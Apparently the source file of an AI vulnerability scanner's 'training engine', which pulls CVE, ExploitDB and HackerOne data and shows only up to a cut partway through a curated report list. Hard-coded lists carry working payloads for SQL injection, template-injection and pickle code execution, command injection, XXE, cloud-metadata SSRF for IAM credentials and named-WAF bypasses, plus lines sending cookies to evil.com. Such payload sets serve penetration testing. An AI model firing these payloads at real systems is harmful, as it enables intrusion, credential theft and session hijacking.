"""
Training Engine — Autonomous Self-Learning for PHANTOM AI

Sources:
1. NVD (National Vulnerability Database) — CVE data with CWE mappings
2. ExploitDB — Real exploit techniques and payloads
3. Own past scans — Reinforcement from scan history
4. Synthetic scenarios — Generates training cases from knowledge gaps

The AI learns:
- CWE → vuln_type mappings (what attack types match what weaknesses)
- Technology → vulnerability correlations from CVE data
- Payload patterns from ExploitDB
- Detection signatures and indicators
- WAF bypass techniques
"""
import asyncio
import json
import logging
import re
import uuid
from datetime import datetime, timedelta
from collections import defaultdict

import httpx
from sqlalchemy import select, func, and_, distinct
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.knowledge import KnowledgePattern, AgentDecision
from app.models.vulnerability import Vulnerability, VulnType, Severity
from app.models.scan import Scan, ScanStatus
from app.models.target import Target

logger = logging.getLogger(__name__)

# CWE → PHANTOM vuln_type mapping
CWE_TO_VULN_TYPE = {
    "CWE-79": "xss_reflected",
    "CWE-80": "xss_reflected",
    "CWE-87": "xss_reflected",
    "CWE-89": "sqli",
    "CWE-90": "sqli",
    "CWE-564": "sqli",
    "CWE-918": "ssrf",
    "CWE-22": "lfi",
    "CWE-23": "lfi",
    "CWE-36": "lfi",
    "CWE-78": "cmd_injection",
    "CWE-77": "cmd_injection",
    "CWE-94": "cmd_injection",
    "CWE-502": "deserialization",
    "CWE-611": "xxe",
    "CWE-601": "open_redirect",
    "CWE-352": "csrf",
    "CWE-284": "idor",
    "CWE-639": "idor",
    "CWE-862": "idor",
    "CWE-1321": "prototype_pollution",
    "CWE-384": "session_fixation",
    "CWE-614": "misconfig",
    "CWE-16": "misconfig",
    "CWE-200": "info_disclosure",
    "CWE-209": "info_disclosure",
    "CWE-532": "info_disclosure",
    "CWE-94": "ssti",
    "CWE-1336": "ssti",
}

# Technology keywords in CPE strings
TECH_FROM_CPE = {
    "php": "php", "wordpress": "wordpress", "drupal": "drupal",
    "joomla": "joomla", "apache": "apache", "nginx": "nginx",
    "node.js": "node", "nodejs": "node", "express": "node",
    "django": "python", "flask": "python", "python": "python",
    "spring": "java", "java": "java", "tomcat": "java",
    "ruby": "ruby", "rails": "ruby",
    "asp.net": "aspnet", ".net": "aspnet", "iis": "aspnet",
    "react": "react", "angular": "angular", "vue": "vue",
    "mysql": "mysql", "postgresql": "postgresql", "mongodb": "mongodb",
    "redis": "redis", "elasticsearch": "elasticsearch",
    "docker": "docker", "kubernetes": "kubernetes",
    "laravel": "laravel", "symfony": "symfony",
    "nextjs": "nextjs", "nuxt": "nuxt",
}

# Severity from CVSS score
def cvss_to_severity(score: float) -> str:
    if score >= 9.0: return "critical"
    if score >= 7.0: return "high"
    if score >= 4.0: return "medium"
    if score >= 0.1: return "low"
    return "info"


class TrainingEngine:
    """Autonomous learning engine that studies public vuln data."""

    def __init__(self):
        self.client = httpx.AsyncClient(timeout=30.0, follow_redirects=True)
        self.stats = {
            "cves_processed": 0,
            "patterns_created": 0,
            "patterns_updated": 0,
            "exploitdb_learned": 0,
            "hacktivity_learned": 0,
            "bounty_scan_learned": 0,
            "errors": 0,
        }

    async def close(self):
        await self.client.aclose()

    # ---- Main Training Loop ----

    async def train(self, db: AsyncSession, duration_minutes: int = 30) -> dict:
        """Run full training session (study + hunt). Legacy method."""
        study_report = await self.study(db)
        return study_report

    async def study(self, db: AsyncSession) -> dict:
        """Study phase: learn from public data sources (fast, ~2-5s)."""
        start = datetime.utcnow()
        self.stats = {k: 0 for k in self.stats}
        session_log = []

        phases_config = [
            {
                "phase": "nvd_cves",
                "label": "NVD CVEs",
                "url": "https://services.nvd.nist.gov/rest/json/cves/2.0",
                "func": lambda: self._learn_from_nvd(db, days_back=30, max_results=200),
            },
            {
                "phase": "exploitdb",
                "label": "ExploitDB",
                "url": "https://gitlab.com/api/v4/projects/exploit-database%2Fexploitdb/repository/tree",
                "func": lambda: self._learn_from_exploitdb(db, max_results=100),
            },
            {
                "phase": "scan_history",
                "label": "Scan History",
                "url": "local:postgresql (own scan database)",
                "func": lambda: self._reinforce_from_history(db),
            },
            {
                "phase": "gap_analysis",
                "label": "Gap Analysis",
                "url": "local:postgresql (knowledge patterns)",
                "func": lambda: self._analyze_gaps(db),
            },
            {
                "phase": "waf_bypass",
                "label": "WAF Bypass Patterns",
                "url": "builtin:curated WAF bypass payloads",
                "func": lambda: self._learn_waf_patterns(db),
            },
            {
                "phase": "hacktivity",
                "label": "HackerOne Hacktivity",
                "url": "https://hackerone.com/graphql",
                "func": lambda: self._learn_from_hacktivity(db),
            },
        ]

        try:
            for i, phase_cfg in enumerate(phases_config, 1):
                phase_start = datetime.utcnow()
                logger.info(f"Study {i}/{len(phases_config)}: {phase_cfg['label']}...")

                entry = {
                    "phase": phase_cfg["phase"],
                    "label": phase_cfg["label"],
                    "url": phase_cfg["url"],
                    "start": phase_start.isoformat(),
                }

                try:
                    result = await phase_cfg["func"]()
                    if isinstance(result, dict):
                        if "count" in result:
                            entry["results"] = result["count"]
                            entry["domains"] = result.get("domains", [])
                        else:
                            entry["results"] = len(result.get("weak_vuln_types", result))
                    else:
                        entry["results"] = result
                except Exception as phase_err:
                    entry["results"] = 0
                    entry["error"] = str(phase_err)
                    logger.error(f"Study phase {phase_cfg['phase']} error: {phase_err}")

                phase_end = datetime.utcnow()
                entry["end"] = phase_end.isoformat()
                entry["duration_seconds"] = round((phase_end - phase_start).total_seconds(), 2)

                session_log.append(entry)
                await db.commit()

        except Exception as e:
            logger.error(f"Study error: {e}")
            self.stats["errors"] += 1
            session_log.append({"phase": "error", "error": str(e)})

        # Save study session record
        report = self._build_report(session_log, start)
        report["type"] = "study"
        await self._save_training_session(db, report)
        await db.commit()

        return report

    # ---- Phase 1: NVD CVE Learning ----

    async def _learn_from_nvd(self, db: AsyncSession, days_back: int = 30, max_results: int = 200) -> int:
        """Fetch recent CVEs from NVD API and learn tech→vuln correlations."""
        count = 0
        end_date = datetime.utcnow()
        start_date = end_date - timedelta(days=days_back)

        # NVD API 2.0
        url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
        params = {
            "pubStartDate": start_date.strftime("%Y-%m-%dT00:00:00.000"),
            "pubEndDate": end_date.strftime("%Y-%m-%dT23:59:59.999"),
            "resultsPerPage": min(max_results, 100),
        }

        try:
            resp = await self.client.get(url, params=params)
            if resp.status_code != 200:
                logger.warning(f"NVD API returned {resp.status_code}")
                return 0

            data = resp.json()
            vulnerabilities = data.get("vulnerabilities", [])

            for item in vulnerabilities[:max_results]:
                cve = item.get("cve", {})
                await self._process_cve(db, cve)
                count += 1
                self.stats["cves_processed"] += 1

                # Batch commit every 50
                if count % 50 == 0:
                    await db.commit()

        except httpx.TimeoutException:
            logger.warning("NVD API timeout — will retry next session")
        except Exception as e:
            logger.error(f"NVD learning error: {e}")
            self.stats["errors"] += 1

        return count

    async def _process_cve(self, db: AsyncSession, cve: dict):
        """Extract knowledge from a single CVE entry."""
        cve_id = cve.get("id", "")
        descriptions = cve.get("descriptions", [])
        desc_en = next((d["value"] for d in descriptions if d.get("lang") == "en"), "")

        # Extract CWE
        weaknesses = cve.get("weaknesses", [])
        cwes = []
        for w in weaknesses:
            for desc in w.get("description", []):
                cwe_val = desc.get("value", "")
                if cwe_val.startswith("CWE-"):
                    cwes.append(cwe_val)

        # Extract CVSS score
        metrics = cve.get("metrics", {})
        cvss_score = 0.0
        for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            metric_list = metrics.get(key, [])
            if metric_list:
                cvss_data = metric_list[0].get("cvssData", {})
                cvss_score = cvss_data.get("baseScore", 0.0)
                break

        # Extract technologies from CPE
        configurations = cve.get("configurations", [])
        technologies = set()
        for config in configurations:
            for node in config.get("nodes", []):
                for match in node.get("cpeMatch", []):
                    cpe = match.get("criteria", "")
                    for keyword, tech in TECH_FROM_CPE.items():
                        if keyword in cpe.lower():
                            technologies.add(tech)

        # Map CWE to vuln_type
        vuln_types = set()
        for cwe in cwes:
            vt = CWE_TO_VULN_TYPE.get(cwe)
            if vt:
                vuln_types.add(vt)

        # If no CWE mapping, try description-based classification
        if not vuln_types:
            vuln_types = self._classify_from_description(desc_en)

        # Store correlations
        for tech in technologies:
            for vt in vuln_types:
                await self._update_pattern(
                    db,
                    pattern_type="tech_vuln_correlation",
                    technology=tech,
                    vuln_type=vt,
                    data_update={
                        "source": "nvd",
                        "cve_example": cve_id,
                        "cvss_avg": cvss_score,
                        "severity": cvss_to_severity(cvss_score),
                    },
                )

        # Store detection indicators from description
        if vuln_types and desc_en:
            indicators = self._extract_indicators(desc_en)
            if indicators:
                for vt in vuln_types:
                    await self._update_pattern(
                        db,
                        pattern_type="detection_indicator",
                        technology=list(technologies)[0] if technologies else "generic",
                        vuln_type=vt,
                        data_update={
                            "indicators": indicators,
                            "source": "nvd",
                            "cve": cve_id,
                        },
                    )

    def _classify_from_description(self, desc: str) -> set[str]:
        """Classify vulnerability type from CVE description text."""
        desc_lower = desc.lower()
        types = set()

        patterns = {
            "xss_reflected": ["cross-site scripting", "xss", "script injection"],
            "sqli": ["sql injection", "sqli", "sql command"],
            "cmd_injection": ["command injection", "os command", "shell injection", "remote code execution via command"],
            "ssrf": ["server-side request forgery", "ssrf", "internal network"],
            "lfi": ["local file inclusion", "path traversal", "directory traversal", "file read"],
            "xxe": ["xml external entity", "xxe"],
            "csrf": ["cross-site request forgery", "csrf"],
            "ssti": ["template injection", "ssti", "server-side template"],
            "deserialization": ["deserialization", "unserialize", "pickle", "readobject"],
            "open_redirect": ["open redirect", "url redirect", "unvalidated redirect"],
            "idor": ["insecure direct object", "idor", "broken access control", "authorization bypass"],
            "misconfig": ["misconfiguration", "default credentials", "insecure default"],
            "info_disclosure": ["information disclosure", "information leak", "sensitive data exposure"],
        }

        for vt, keywords in patterns.items():
            if any(kw in desc_lower for kw in keywords):
                types.add(vt)

        return types

    def _extract_indicators(self, desc: str) -> list[str]:
        """Extract detection indicators from CVE description."""
        indicators = []
        # Extract parameter names, endpoints, headers mentioned
        param_matches = re.findall(r'(?:parameter|param|field|input)\s+"?(\w+)"?', desc, re.IGNORECASE)
        indicators.extend(param_matches[:5])

        endpoint_matches = re.findall(r'(?:endpoint|url|path|route)\s+"?(/[\w/.-]+)"?', desc, re.IGNORECASE)
        indicators.extend(endpoint_matches[:5])

        header_matches = re.findall(r'(?:header)\s+"?([\w-]+)"?', desc, re.IGNORECASE)
        indicators.extend(header_matches[:3])

        return indicators

    # ---- Phase 2: ExploitDB Learning ----

    async def _learn_from_exploitdb(self, db: AsyncSession, max_results: int = 100) -> int:
        """Learn payload patterns from ExploitDB's public API / GitHub mirror."""
        count = 0

        # Use ExploitDB's GitLab API for recent exploits
        # We learn the types and techniques, not download actual exploit code
        url = "https://gitlab.com/api/v4/projects/exploit-database%2Fexploitdb/repository/tree"
        params = {"path": "exploits", "per_page": 20}

        try:
            resp = await self.client.get(url, params=params)
            if resp.status_code != 200:
                logger.info("ExploitDB API unavailable, using built-in knowledge")
                return await self._learn_builtin_exploitdb(db)

            # Process directory listing to understand exploit categories
            items = resp.json()
            categories = [item["name"] for item in items if item.get("type") == "tree"]

            for category in categories:
                vuln_type = self._exploitdb_category_to_vuln_type(category)
                if vuln_type:
                    await self._update_pattern(
                        db,
                        pattern_type="attack_technique",
                        technology="generic",
                        vuln_type=vuln_type,
                        data_update={
                            "source": "exploitdb",
                            "category": category,
                        },
                    )
                    count += 1
                    self.stats["exploitdb_learned"] += 1

        except Exception as e:
            logger.info(f"ExploitDB API error: {e}, using built-in knowledge")
            count = await self._learn_builtin_exploitdb(db)

        return count

    async def _learn_builtin_exploitdb(self, db: AsyncSession) -> int:
        """Load curated exploit knowledge when API is unavailable."""
        count = 0
        knowledge = [
            # (tech, vuln_type, technique, payloads, severity)
            ("php", "sqli", "union_based", [
                "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ], "critical"),
            ("php", "lfi", "php_wrappers", [
                "php://filter/convert.base64-encode/resource=index.php",
                "php://input",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
                "expect://id",
                "phar:///var/www/uploads/evil.phar",
            ], "high"),
            ("php", "cmd_injection", "php_system_functions", [
                "; cat /etc/passwd",
                "| whoami",
                "$(id)",
                "`id`",
                "%0aid",
                "${IFS}cat${IFS}/etc/passwd",
            ], "critical"),
            ("node", "ssti", "javascript_template", [
                "{{constructor.constructor('return this')()}",
                "#{7*7}",
                "${7*7}",
                "{{this.constructor.constructor('return process.env')()}}",
            ], "high"),
            ("node", "prototype_pollution", "proto_injection", [
                '{"__proto__":{"isAdmin":true}}',
                '{"constructor":{"prototype":{"isAdmin":true}}}',
            ], "high"),
            ("java", "deserialization", "java_gadgets", [
                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",  # serialized HashMap
            ], "critical"),
            ("java", "sqli", "hibernate_injection", [
                "' AND 1=CAST((SELECT version()) AS int)--",
                "1'; EXEC xp_cmdshell('whoami')--",
            ], "critical"),
            ("python", "ssti", "jinja2", [
                "{{config}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            ], "critical"),
            ("python", "deserialization", "pickle_rce", [
                "cos\nsystem\n(S'id'\ntR.",
            ], "critical"),
            ("aspnet", "deserialization", "viewstate", [
                "__VIEWSTATE=...",
            ], "high"),
            ("wordpress", "sqli", "wpdb_injection", [
                "1' AND (SELECT 1 FROM wp_users WHERE user_login='admin' AND SUBSTRING(user_pass,1,1)='$')--",
            ], "critical"),
            ("wordpress", "lfi", "wp_file_inclusion", [
                "../wp-config.php",
                "....//....//wp-config.php",
            ], "high"),
            ("generic", "xss_reflected", "polyglot", [
                'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
                '"><svg/onload=alert(1)//',
                "'-alert(1)-'",
                '<img/src=x onerror=alert(1)>',
                '{{constructor.constructor("alert(1)")()}}',
            ], "medium"),
            ("generic", "ssrf", "cloud_metadata", [
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/computeMetadata/v1/",
                "http://100.100.100.200/latest/meta-data/",
                "http://169.254.169.254/metadata/v1/",
                "http://[fd00:ec2::254]/latest/meta-data/",
            ], "critical"),
            ("generic", "xxe", "entity_injection", [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
            ], "high"),
            ("generic", "open_redirect", "url_bypass", [
                "//evil.com",
                "https://evil.com",
                "/\\evil.com",
                "//evil.com/%2f..",
                "https://legitimate.com@evil.com",
                "https://evil.com#@legitimate.com",
            ], "medium"),
        ]

        for tech, vuln_type, technique, payloads, severity in knowledge:
            await self._update_pattern(
                db,
                pattern_type="effective_payload",
                technology=tech,
                vuln_type=vuln_type,
                data_update={
                    "technique": technique,
                    "payloads": payloads,
                    "payload": payloads[0],
                    "severity": severity,
                    "source": "exploitdb_curated",
                },
            )
            count += 1
            self.stats["exploitdb_learned"] += 1

        return count

    def _exploitdb_category_to_vuln_type(self, category: str) -> str | None:
        mapping = {
            "webapps": "xss_reflected",
            "remote": "cmd_injection",
            "local": "lfi",
            "dos": None,
            "shellcodes": None,
        }
        return mapping.get(category.lower())

    # ---- Phase 3: Reinforce from Own History ----

    async def _reinforce_from_history(self, db: AsyncSession) -> int:
        """Analyze own past scans to reinforce learning."""
        count = 0

        # Get all completed scans
        result = await db.execute(
            select(Scan).where(Scan.status == ScanStatus.COMPLETED)
        )
        scans = result.scalars().all()

        if not scans:
            return 0

        # Aggregate: which vuln types found per technology
        tech_vuln_hits = defaultdict(lambda: defaultdict(int))
        tech_scan_count = defaultdict(int)

        for scan in scans:
            target_result = await db.execute(
                select(Target).where(Target.id == scan.target_id)
            )
            target = target_result.scalar_one_or_none()
            if not target:
                continue

            technologies = list((target.technologies or {}).get("summary", {}).keys())

            vulns_result = await db.execute(
                select(Vulnerability).where(Vulnerability.scan_id == scan.id)
            )
            vulns = vulns_result.scalars().all()

            for tech in technologies:
                tech_lower = tech.lower()
                tech_scan_count[tech_lower] += 1
                for v in vulns:
                    tech_vuln_hits[tech_lower][v.vuln_type.value] += 1

        # Update patterns with aggregated data
        for tech, vuln_counts in tech_vuln_hits.items():
            scans_tested = tech_scan_count[tech]
            for vt, found_count in vuln_counts.items():
                success_rate = found_count / scans_tested
                await self._update_pattern(
                    db,
                    pattern_type="tech_vuln_correlation",
                    technology=tech,
                    vuln_type=vt,
                    data_update={
                        "success_rate": success_rate,
                        "vulns_found": found_count,
                        "scans_tested": scans_tested,
                        "source": "scan_history",
                    },
                    confidence=min(0.95, 0.3 + scans_tested * 0.1),
                )
                count += 1

        # Learn from productive vs unproductive agent decisions
        decisions_result = await db.execute(
            select(AgentDecision).where(AgentDecision.was_productive.isnot(None))
        )
        decisions = decisions_result.scalars().all()

        productive_actions = defaultdict(int)
        total_actions = defaultdict(int)

        for d in decisions:
            action = d.action
            total_actions[action] += 1
            if d.was_productive:
                productive_actions[action] += 1

        for action, total in total_actions.items():
            productive = productive_actions.get(action, 0)
            if total >= 2:
                await self._update_pattern(
                    db,
                    pattern_type="scan_strategy",
                    technology="agent_decisions",
                    vuln_type=action,
                    data_update={
                        "action": action,
                        "productive_rate": productive / total,
                        "total_uses": total,
                        "productive_uses": productive,
                        "source": "agent_history",
                    },
                    confidence=min(0.9, 0.3 + total * 0.05),
                )
                count += 1

        return count

    # ---- Phase 4: Gap Analysis ----

    async def _analyze_gaps(self, db: AsyncSession) -> dict:
        """Identify what the AI doesn't know well and needs more training on."""
        gaps = {
            "weak_vuln_types": [],
            "unknown_technologies": [],
            "low_confidence_patterns": [],
            "recommendations": [],
        }

        # All possible vuln types
        all_vuln_types = [vt.value for vt in VulnType]

        # Check which vuln types have patterns
        for vt in all_vuln_types:
            result = await db.execute(
                select(func.count(KnowledgePattern.id)).where(
                    and_(
                        KnowledgePattern.vuln_type == vt,
                        KnowledgePattern.confidence > 0.4,
                    )
                )
            )
            count = result.scalar() or 0
            if count < 3:
                gaps["weak_vuln_types"].append({
                    "vuln_type": vt,
                    "patterns_count": count,
                    "status": "no_data" if count == 0 else "insufficient",
                })

        # Check which common technologies are underrepresented
        common_techs = [
            "php", "node", "python", "java", "aspnet", "ruby",
            "wordpress", "laravel", "django", "spring", "react", "angular",
        ]
        for tech in common_techs:
            result = await db.execute(
                select(func.count(KnowledgePattern.id)).where(
                    KnowledgePattern.technology == tech
                )
            )
            count = result.scalar() or 0
            if count < 5:
                gaps["unknown_technologies"].append({
                    "technology": tech,
                    "patterns_count": count,
                })

        # Find low confidence patterns
        result = await db.execute(
            select(KnowledgePattern).where(
                KnowledgePattern.confidence < 0.5
            ).order_by(KnowledgePattern.confidence.asc()).limit(20)
        )
        low_conf = result.scalars().all()
        for p in low_conf:
            gaps["low_confidence_patterns"].append({
                "type": p.pattern_type,
                "tech": p.technology,
                "vuln": p.vuln_type,
                "confidence": p.confidence,
                "samples": p.sample_count,
            })

        # Generate recommendations
        if gaps["weak_vuln_types"]:
            weak = [g["vuln_type"] for g in gaps["weak_vuln_types"][:5]]
            gaps["recommendations"].append({
                "type": "scan_practice",
                "message": f"Run scans on targets with known {', '.join(weak)} vulnerabilities to improve detection.",
                "suggested_targets": self._suggest_training_targets(weak),
            })

        if gaps["unknown_technologies"]:
            unknown = [g["technology"] for g in gaps["unknown_technologies"][:5]]
            gaps["recommendations"].append({
                "type": "tech_exposure",
                "message": f"Need more experience with {', '.join(unknown)} applications. "
                          "Scan targets using these technologies.",
            })

        total_patterns = await db.execute(
            select(func.count(KnowledgePattern.id))
        )
        total = total_patterns.scalar() or 0
        if total < 50:
            gaps["recommendations"].append({
                "type": "more_training",
                "message": "Knowledge base is still small. Run more training sessions and scans "
                          "to build a larger dataset. Current patterns: " + str(total),
            })

        # Save gap analysis as a pattern for future reference
        await self._update_pattern(
            db,
            pattern_type="gap_analysis",
            technology="system",
            vuln_type=None,
            data_update={
                "weak_types": len(gaps["weak_vuln_types"]),
                "unknown_techs": len(gaps["unknown_technologies"]),
                "low_conf": len(gaps["low_confidence_patterns"]),
                "analyzed_at": datetime.utcnow().isoformat(),
            },
        )

        return gaps

    def _suggest_training_targets(self, vuln_types: list[str]) -> list[dict]:
        """Suggest practice targets for weak areas."""
        targets = {
            "sqli": {"name": "DVWA", "url": "http://dvwa", "note": "SQL injection in low/medium security"},
            "xss_reflected": {"name": "DVWA", "url": "http://dvwa", "note": "XSS reflected/stored exercises"},
            "cmd_injection": {"name": "DVWA", "url": "http://dvwa", "note": "Command injection exercises"},
            "lfi": {"name": "DVWA", "url": "http://dvwa", "note": "File inclusion exercises"},
            "ssrf": {"name": "Juice Shop", "url": "http://juice-shop:3000", "note": "SSRF challenges"},
            "ssti": {"name": "Juice Shop", "url": "http://juice-shop:3000", "note": "Template injection"},
            "deserialization": {"name": "WebGoat", "url": "http://webgoat:8080", "note": "Deserialization lessons"},
            "xxe": {"name": "WebGoat", "url": "http://webgoat:8080", "note": "XXE lessons"},
            "idor": {"name": "Juice Shop", "url": "http://juice-shop:3000", "note": "Broken access control"},
            "csrf": {"name": "DVWA", "url": "http://dvwa", "note": "CSRF exercises"},
            "open_redirect": {"name": "Juice Shop", "url": "http://juice-shop:3000", "note": "Redirect challenges"},
        }
        return [targets[vt] for vt in vuln_types if vt in targets]

    # ---- Phase 5: WAF Bypass Patterns ----

    async def _learn_waf_patterns(self, db: AsyncSession) -> int:
        """Learn WAF bypass techniques from curated knowledge."""
        count = 0
        waf_bypasses = [
            ("cloudflare", "xss_reflected", [
                "<svg/onload=alert(1)//",
                "<img src=x onerror=alert`1`>",
                '<svg onload="&#97;&#108;&#101;&#114;&#116;(1)">',
                "<details/open/ontoggle=alert(1)>",
            ]),
            ("cloudflare", "sqli", [
                "/*!50000UNION*/+/*!50000SELECT*/+1,2,3--",
                "1'||UTL_INADDR.get_host_address('a]]')||'",
                "1' /*!50000AND*/ 1=1--",
            ]),
            ("akamai", "xss_reflected", [
                '<svg/onload="alert(1)"///',
                "javascript:alert(1)//",
                "<img src=x onerror=\\u0061lert(1)>",
            ]),
            ("akamai", "sqli", [
                "%55NION %53ELECT 1,2,3--",
                "1'%20or%201=1--",
                "un/**/ion sel/**/ect 1,2,3--",
            ]),
            ("modsecurity", "xss_reflected", [
                "<svg\tonload=alert(1)>",
                '"><img/src=x\tonerror=alert(1)>',
                "<svg/onload=alert(String.fromCharCode(88,83,83))>",
            ]),
            ("modsecurity", "sqli", [
                "1' AnD 1=1--",
                "1'/**/oR/**/1=1--",
                "1'%0bor%0b1=1--",
            ]),
            ("imperva", "sqli", [
                "1' /*!12345or*/ 1=1--",
                "1'%09or%091=1--",
                "1'||1=1--",
            ]),
            ("f5_bigip", "sqli", [
                "1' or 1=1%23",
                "1'%20or%201=1--",
                "1' oR '1'='1",
            ]),
        ]

        for waf, vuln_type, payloads in waf_bypasses:
            await self._update_pattern(
                db,
                pattern_type="waf_bypass",
                technology=waf,
                vuln_type=vuln_type,
                data_update={
                    "waf": waf,
                    "payloads": payloads,
                    "payload": payloads[0],
                    "source": "curated_research",
                },
            )
            count += 1

        return count

    # ---- Phase 6: HackerOne Hacktivity (Disclosed Reports) ----

    async def _learn_from_hacktivity(self, db: AsyncSession) -> int:
        """Learn real-world techniques from publicly disclosed HackerOne reports."""
        count = 0

        # HackerOne Hacktivity GraphQL API — public disclosed reports
        url = "https://hackerone.com/graphql"
        query = """
        query {
          hacktivity_items(first: 50, order_by: {field: popular, direction: DESC},
            where: {disclosed_at: {_is_null: false}}) {
            edges {
              node {
                ... on HacktivityItemInterface {
                  id
                  databaseId: _id
                  reporter { username }
                  severity_rating
                  upvoted: votes
                  disclosed_at
                  report {
                    id
                    title
                    substate
                    weakness {
                      name
                      external_id
                    }
                    severity {
                      rating
                      score
                    }
                    summaries(first: 1) {
                      edges { node { content } }
                    }
                  }
                  team {
                    handle
                    name
                  }
                }
              }
            }
          }
        }
        """

        try:
            resp = await self.client.post(
                url,
                json={"query": query},
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                },
            )

            if resp.status_code != 200:
                logger.info(f"HackerOne API returned {resp.status_code}, using curated reports")
                return await self._learn_curated_hacktivity(db)

            data = resp.json()
            edges = (data.get("data", {}).get("hacktivity_items", {}).get("edges", []))

            if not edges:
                logger.info("No hacktivity data returned, using curated reports")
                return await self._learn_curated_hacktivity(db)

            for edge in edges:
                node = edge.get("node", {})
                report = node.get("report", {})
                if not report:
                    continue

                title = report.get("title", "")
                weakness = report.get("weakness", {}) or {}
                cwe_id = weakness.get("external_id", "")
                weakness_name = weakness.get("name", "")
                severity = (report.get("severity", {}) or {})
                team = node.get("team", {}) or {}

                # Map to PHANTOM vuln type
                vuln_type = None
                if cwe_id:
                    vuln_type = CWE_TO_VULN_TYPE.get(cwe_id)
                if not vuln_type:
                    vtypes = self._classify_from_description(f"{title} {weakness_name}")
                    vuln_type = next(iter(vtypes), None)

                if not vuln_type:
                    continue

                # Extract techniques from title
                techniques = self._extract_techniques_from_title(title)

                # Get summary content if available
                summaries = report.get("summaries", {}).get("edges", [])
                summary_text = ""
                if summaries:
                    summary_text = summaries[0].get("node", {}).get("content", "")

                # Extract indicators from summary
                indicators = []
                if summary_text:
                    indicators = self._extract_indicators(summary_text)

                await self._update_pattern(
                    db,
                    pattern_type="hacktivity_technique",
                    technology=team.get("handle", "generic"),
                    vuln_type=vuln_type,
                    data_update={
                        "source": "hackerone_hacktivity",
                        "title": title[:200],
                        "weakness": weakness_name,
                        "cwe": cwe_id,
                        "severity_rating": severity.get("rating", ""),
                        "cvss_score": severity.get("score", 0),
                        "techniques": techniques,
                        "indicators": indicators,
                        "program": team.get("handle", ""),
                    },
                )
                count += 1

                if count % 20 == 0:
                    await db.commit()

        except Exception as e:
            logger.info(f"Hacktivity API error: {e}, using curated reports")
            count = await self._learn_curated_hacktivity(db)

        return count

    async def _learn_curated_hacktivity(self, db: AsyncSession) -> int:
        """Curated real-world bug bounty techniques when API is unavailable."""
        count = 0
        # Real techniques from famous disclosed reports
        reports = [
            ("sqli", "generic", {
                "title": "SQL injection via search parameter with WAF bypass",
                "techniques": ["union_bypass", "comment_injection", "case_switching"],
                "payloads": [
                    "1'/**/UNION/**/SELECT/**/1,2,3--",
                    "1' AND extractvalue(1,concat(0x7e,version()))--",
                    "-1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--",
                ],
                "indicators": ["search", "q", "query", "id", "filter"],
                "severity_rating": "critical",
            }),
            ("ssrf", "generic", {
                "title": "SSRF via URL parameter to access AWS metadata",
                "techniques": ["dns_rebinding", "redirect_bypass", "ip_obfuscation"],
                "payloads": [
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
                    "http://0x7f000001/",
                    "http://2130706433/",
                    "http://017700000001/",
                    "http://0177.0.0.1/",
                ],
                "indicators": ["url", "uri", "src", "href", "redirect", "callback", "webhook"],
                "severity_rating": "critical",
            }),
            ("idor", "generic", {
                "title": "IDOR on API endpoint allows reading other users data",
                "techniques": ["sequential_id", "uuid_prediction", "param_pollution"],
                "payloads": [
                    "/api/users/1", "/api/users/2",
                    "/api/v1/account/OTHER_USER_ID/profile",
                    "/graphql?query={user(id:1){email,password}}",
                ],
                "indicators": ["user_id", "account_id", "order_id", "id", "uid"],
                "severity_rating": "high",
            }),
            ("xss_stored", "generic", {
                "title": "Stored XSS via markdown rendering in comments",
                "techniques": ["markdown_injection", "svg_upload", "csp_bypass"],
                "payloads": [
                    '[Click](javascript:alert(document.cookie))',
                    '![x](https://evil.com/x.png"onerror="alert(1))',
                    '<svg/onload=fetch("https://evil.com/"+document.cookie)>',
                    '"><img src=x onerror=alert(document.domain)>',
                ],
                "indicators": ["comment", "bio", "description", "title", "name", "message"],
                "severity_rating": "high",
            }),
            ("auth_bypass", "generic", {
                "title": "Authentication bypass via JWT none algorithm",
                "techniques": ["jwt_none", "jwt_weak_secret", "jwt_key_confusion"],
                "payloads": [
                    '{"alg":"none","typ":"JWT"}',
                    '{"alg":"HS256"}+secret:""',
                    '{"alg":"RS256"}→{"alg":"HS256"}+public_key_as_secret',
                ],
                "indicators": ["Authorization", "Bearer", "token", "jwt", "session"],
                "severity_rating": "critical",
            }),
            ("race_condition", "generic", {
                "title": "Race condition in coupon redemption allows double-spend",
                "techniques": ["parallel_requests", "toctou", "limit_bypass"],
                "payloads": [
                    "Send 50 parallel POST /api/redeem-coupon requests",
                    "Parallel PUT /api/transfer with same transaction",
                ],
                "indicators": ["redeem", "transfer", "withdraw", "coupon", "vote", "like", "follow"],
                "severity_rating": "high",
            }),
            ("xss_dom", "generic", {
                "title": "DOM XSS via postMessage handler without origin check",
                "techniques": ["postmessage_xss", "dom_clobbering", "angular_sandbox_escape"],
                "payloads": [
                    'window.postMessage("<img src=x onerror=alert(1)>","*")',
                    '#"><img src=x onerror=alert(1)>',
                    'javascript:void(document.location="https://evil.com/?c="+document.cookie)',
                    '{{constructor.constructor("alert(1)")()}}',
                ],
                "indicators": ["postMessage", "addEventListener", "innerHTML", "location.hash", "window.name"],
